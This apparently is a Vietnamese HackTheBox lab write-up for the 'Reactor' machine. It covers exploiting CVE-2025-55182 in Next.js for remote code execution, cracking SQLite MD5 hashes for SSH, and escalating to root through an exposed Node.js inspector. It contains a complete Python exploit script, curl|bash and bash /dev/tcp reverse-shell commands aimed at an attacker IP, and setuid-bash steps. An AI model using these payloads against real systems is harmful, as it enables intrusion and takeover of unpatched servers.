---
title: "HackTheBox Write-up: Reactor"
date: 2026-06-01 
categories: [Write-ups, HackTheBox]
tags: [linux, easy, react2shell, cve-2025-55182]
---
# HackTheBox — Reactor

<p align="center">
  <b>OS:</b> Linux &nbsp;|&nbsp; <b>Difficulty:</b> Easy &nbsp;|&nbsp; <b>Points:</b> 20
</p>

---

## 📋 Tóm tắt

| Phase | Technique |
|-------|-----------|
| **Recon** | Nmap → SSH (22) + Next.js (3000) |
| **Foothold** | CVE-2025-55182 (React2Shell) — RSC Flight deserialization → RCE |
| **Lateral Movement** | SQLite DB credential extraction → MD5 crack → SSH |
| **Privilege Escalation** | Node.js Inspector (`--inspect :9229`) chạy root → debugger RCE |

```
Attacker ──► Next.js 15.0.3 (React2Shell) ──► node shell
                                                  │
                                            reactor.db (SQLite)
                                                  │
                                            MD5 crack → SSH engineer
                                                  │
                                        Node.js Inspector :9229 (root)
                                                  │
                                              ROOT SHELL
```

---

## 1. Reconnaissance

### 1.1 Nmap

```bash
nmap -sC -sV -p- -oN nmap.txt 10.129.7.128
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
3000/tcp open  http    Node.js (Next.js)
|_http-title: ReactorWatch | Core Monitoring System
```

Hai port mở: **SSH** và một **web app Next.js** trên port 3000.

### 1.2 Web Application

Truy cập `http://10.129.7.128:3000` — một dashboard giám sát lò phản ứng hạt nhân:

- **ReactorWatch v3.2.1** — Core Monitoring System
- Hiển thị: Core Status, Core Temp (324°C), Pressure (155 bar), Coolant Flow, Turbine Output (1.21 GW)
- System Logs và On-Site Personnel (Dr. Elena Rodriguez, Marcus Kim, James Thompson)
- Footer: `NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED`

### 1.3 Fingerprinting

```bash
curl -s -I http://10.129.7.128:3000/ | grep -i "x-powered-by"
```
```
X-Powered-By: Next.js
```

Từ HTML source, trích xuất được **build ID** và xác nhận dùng **App Router** (React Server Components):

```
"b":"L3bimJe_3LvBcFWAnK5L4"    ← Build ID
"P":null                        ← No Server Actions defined
```

Kiểm tra các file static → xác nhận **Next.js 15.0.3**:

```bash
curl -s http://10.129.7.128:3000/_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js
```

### 1.4 Directory Fuzzing

```bash
ffuf -u http://10.129.7.128:3000/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -fc 404
```

Không tìm được route ẩn nào. Middleware chặn mọi path không hợp lệ → 404.

---

## 2. Foothold — CVE-2025-55182 (React2Shell)

### 2.1 Phân tích lỗ hổng

**Next.js 15.0.3** sử dụng **React 19.x** với Server Components, bị ảnh hưởng bởi **CVE-2025-55182** (CVSS 10.0) — hay còn gọi là **React2Shell**.

Lỗ hổng nằm trong quá trình **deserialization** của React **Flight protocol**. Khi server nhận POST request có header `Next-Action`, nó cố parse payload dưới dạng Server Action. Deserializer không validate đúng các property của object, cho phép:

1. **Fake Chunk Injection** — tạo chunk giả với `status: "resolved_model"`
2. **Prototype Traversal** — dùng `$1:constructor:constructor` để truy cập `Function` constructor
3. **`$B` Blob Handler Abuse** — khi xử lý Blob reference, server gọi `_formData.get(_prefix)`
4. **RCE** — vì `_formData.get` đã bị ghi đè bằng `Function` constructor, `_prefix` (chứa command) sẽ được thực thi

### 2.2 Xác nhận Server Action Parsing

```bash
curl -s -X POST http://10.129.7.128:3000/ \
  -H "Next-Action: anything" \
  -H "Content-Type: multipart/form-data; boundary=----formdata" \
  -d '------formdata
Content-Disposition: form-data; name="1_$ACTION_ID"

test
------formdata--'
```

```
0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
1:E{"digest":"1181338971"}
```

→ Server **đã parse** RSC Flight payload và trả error. Vulnerability confirmed!

### 2.3 Xác nhận RCE (Pingback)

```bash
# Terminal 1 — HTTP Server để nhận pingback
python3 -m http.server 8000
```

```bash
# Terminal 2 — Gửi exploit payload
python3 attack.py http://10.129.7.128:3000 "curl http://10.10.14.98:8000/PWNED"
```

HTTP server nhận được callback:

```
10.129.7.128 - - "GET /PWNED HTTP/1.1" 404 -
```

✅ **RCE confirmed!** Target đã gửi request về máy attacker.

### 2.4 Reverse Shell

Tạo reverse shell payload và serve qua HTTP server:

```bash
# Tạo file reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1' > ~/reactor_htb/rev.sh

# Serve payload
cd ~/reactor_htb && python3 -m http.server 8000
```

![Target tải rev.sh từ HTTP server của attacker](<img width="700" height="388" alt="Screenshot 2026-06-01 132737" src="https://github.com/user-attachments/assets/551cdb67-48f2-43c2-bcc9-a37f3b81432d" />
)

Bật listener và gửi exploit:

```bash
# Terminal khác — listener
nc -lvnp 4444

# Trigger exploit
python3 attack.py http://10.129.7.128:3000 "curl http://10.10.14.98:8000/rev.sh|bash"
```

![Exploit chạy thành công — request timed out vì reverse shell đã kết nối](<img width="710" height="855" alt="Screenshot 2026-06-01 132801" src="https://github.com/user-attachments/assets/83d445cb-1504-4114-9324-af822a065348" />
)

### 2.5 Shell as `node`

Reverse shell kết nối thành công!

![Reverse shell — whoami: node, listing /opt/reactor-app](<img width="1919" height="864" alt="Screenshot 2026-06-01 132820" src="https://github.com/user-attachments/assets/89230f49-f731-4e71-ab25-489cc7471801" />
)

```
node@reactor:/opt/reactor-app$ whoami
node
```

---

## 3. Lateral Movement — SQLite Credential Extraction

### 3.1 Enumeration

Từ reverse shell, duyệt các file trong `/opt/reactor-app`:

![Enum: .env, SQLite database, /etc/passwd, users table](<img width="883" height="842" alt="Screenshot 2026-06-01 132927" src="https://github.com/user-attachments/assets/4b446462-b8c7-46a0-bdbc-c95d6d1bf6ab" />
)

### 3.2 File .env

```bash
node@reactor:/opt/reactor-app$ cat .env
```

```ini
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
NODE_ENV=production
```

### 3.3 SQLite Database

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db ".tables"
sensor_logs  users

node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"
```

| ID | Username | MD5 Hash | Role | Email |
|----|----------|----------|------|-------|
| 1 | admin | `a203b22191d744a4e70ada5c101b17b8` | administrator | admin@reactor.htb |
| 2 | engineer | `39d97110eafe2a9a68639812cd271e8e` | operator | engineer@reactor.htb |

### 3.4 Crack MD5 Hash

Kiểm tra user hệ thống:

```bash
node@reactor:/opt/reactor-app$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

User `engineer` tồn tại trên hệ thống! Crack hash bằng [CrackStation](https://crackstation.net/) hoặc hashcat:

```bash
echo '39d97110eafe2a9a68639812cd271e8e' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### 3.5 SSH as Engineer

```bash
ssh engineer@10.129.7.128
```

```
engineer@reactor:~$ cat user.txt
f17ce1bb580d6c17894fce4a3e23c3a1
```

🏁 **User Flag: `f17ce1bb580d6c17894fce4a3e23c3a1`**

---

## 4. Privilege Escalation — Node.js Inspector

### 4.1 Phát hiện

```bash
engineer@reactor:~$ ps aux | grep node
root  1418  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Một Node.js process chạy dưới quyền **root** với flag `--inspect=127.0.0.1:9229`. V8 Inspector Protocol cho phép debug và **thực thi JavaScript tùy ý** — tức là ta có thể chạy command dưới quyền root.

```bash
engineer@reactor:~$ ss -tlnp | grep 9229
LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

### 4.2 Khai thác

Kết nối trực tiếp vào debugger từ SSH session:

```bash
node inspect 127.0.0.1:9229
```

Tại prompt `debug>`, thực thi command để đọc root flag:

```javascript
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

![Privilege Escalation — node inspect kết nối thành công, đọc root.txt](<img width="1919" height="846" alt="Screenshot 2026-06-01 132935" src="https://github.com/user-attachments/assets/14c167a8-2ed2-4ce1-abf5-239dc003fcbc" />
)

🏁 **Root Flag obtained!**

### 4.3 Full Root Shell (Optional)

Nếu muốn root shell đầy đủ:

```javascript
// Trong debug> prompt
exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()")
```

Thoát debugger, sau đó:

```bash
/bin/bash -p
whoami
# root
```

### 4.4 Phương pháp thay thế — WebSocket

Nếu `node inspect` không hoạt động:

```bash
# Lấy WebSocket URL
curl -s http://127.0.0.1:9229/json

# Kết nối và thực thi
node -e "
const http = require('http');
http.get('http://127.0.0.1:9229/json', (res) => {
  let d = '';
  res.on('data', (c) => d += c);
  res.on('end', () => {
    const url = JSON.parse(d)[0].webSocketDebuggerUrl;
    const ws = new (require('ws'))(url);
    ws.on('open', () => {
      ws.send(JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: { expression: \"require('child_process').execSync('cat /root/root.txt').toString()\" }
      }));
    });
    ws.on('message', (m) => {
      console.log(JSON.parse(m).result.result.value);
      process.exit();
    });
  });
});
"
```

---

## 5. Exploit Script

<details>
<summary><b>exploit.py</b> — CVE-2025-55182 React2Shell (click to expand)</summary>

```python
#!/usr/bin/env python3
"""
CVE-2025-55182 - React2Shell
RSC Flight Protocol Deserialization → Blob Handler Gadget → Function Constructor → RCE
Target: Next.js 15.x with App Router (React 19.0.0 - 19.2.0)
"""

import requests
import sys
import urllib3
urllib3.disable_warnings()


def exploit(target_url, command):
    """
    Gadget chain:
    1. Fake chunk with status="resolved_model" → skip validation
    2. _response._formData.get → overwritten to Function constructor
       via "$1:constructor:constructor" (self-ref → Object → constructor → Function)
    3. _response._prefix → contains malicious JS code
    4. value='{"then":"$B"}' → triggers Blob handler → calls _formData.get(_prefix)
    5. Function(_prefix)() → executes our code
    """

    boundary = "----WebKitFormBoundaryR2S0"

    payload = (
        '{"status":"resolved_model",'
        '"reason":0,'
        '"_response":{'
        '"_prefix":"process.mainModule.require(\'child_process\')'
        '.execSync(\'' + command + '\').toString();//",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '},'
        '"then":"$1:then",'
        '"value":"{\\"then\\":\\"$B\\"}"}'
    )

    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1_$ACTION_ID"\r\n\r\n'
        f"anything\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{boundary}--\r\n"
    )

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Next-Action": "0",
    }

    print(f"[*] Target:  {target_url}")
    print(f"[*] Command: {command}")
    print(f"[*] Sending exploit...")

    try:
        r = requests.post(
            target_url, headers=headers, data=body,
            verify=False, timeout=30
        )
        print(f"[*] Status: {r.status_code}")
        print(f"[*] Body:   {r.text[:500]}")
    except requests.exceptions.Timeout:
        print("[!] Timed out — reverse shell may have connected!")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url> [command]")
        print(f"  RCE test:  {sys.argv[0]} http://TARGET:3000 id")
        print(f"  Revshell:  {sys.argv[0]} http://TARGET:3000 'curl http://ATTACKER:8000/rev.sh|bash'")
        sys.exit(1)

    exploit(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "id")
```

</details>

---

## 6. Attack Chain Overview

```
┌──────────────────────────────────────────────────────────────────┐
│                                                                  │
│   PORT 3000 — Next.js 15.0.3 (ReactorWatch v3.2.1)              │
│     │                                                            │
│     ▼                                                            │
│   CVE-2025-55182 (React2Shell)                                   │
│   POST / + Next-Action header + Blob gadget chain                │
│     │                                                            │
│     ▼                                                            │
│   RCE as "node" → /opt/reactor-app                               │
│     │                                                            │
│     ├─► cat .env → API keys, DB path                             │
│     └─► sqlite3 reactor.db → users table                         │
│           │                                                      │
│           ▼                                                      │
│         MD5 hashes → hashcat/CrackStation → password             │
│           │                                                      │
│           ▼                                                      │
│         SSH engineer@reactor → user.txt ✓                        │
│           │                                                      │
│           ▼                                                      │
│         ps aux → /usr/bin/node --inspect=127.0.0.1:9229 (ROOT)   │
│           │                                                      │
│           ▼                                                      │
│         node inspect 127.0.0.1:9229                              │
│         exec("require('child_process').execSync('...')")          │
│           │                                                      │
│           ▼                                                      │
│         root.txt ✓                                               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 7. Lessons Learned

- **Luôn update framework**: Next.js 15.0.3 với React 19.x chứa lỗ hổng CVSS 10.0 cho phép pre-auth RCE
- **Không lưu plaintext/weak hash trong database**: MD5 không có salt dễ dàng bị crack trong vài giây
- **Không expose Node.js Inspector trên production**: Flag `--inspect` cho phép thực thi code tùy ý qua debugger protocol, đặc biệt nguy hiểm khi process chạy quyền root

---

## References

- [CVE-2025-55182 — NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [React Security Advisory — react.dev](https://react.dev/blog/2025/12/03/react-security-advisory)
- [Vercel Next.js Security Advisory](https://vercel.com/security/react2shell)
- [Microsoft Threat Intelligence — React2Shell Analysis](https://www.microsoft.com/en-us/security/blog/2025/12/react2shell/)
- [HackTheBox — Reactor](https://app.hackthebox.com/machines/Reactor)
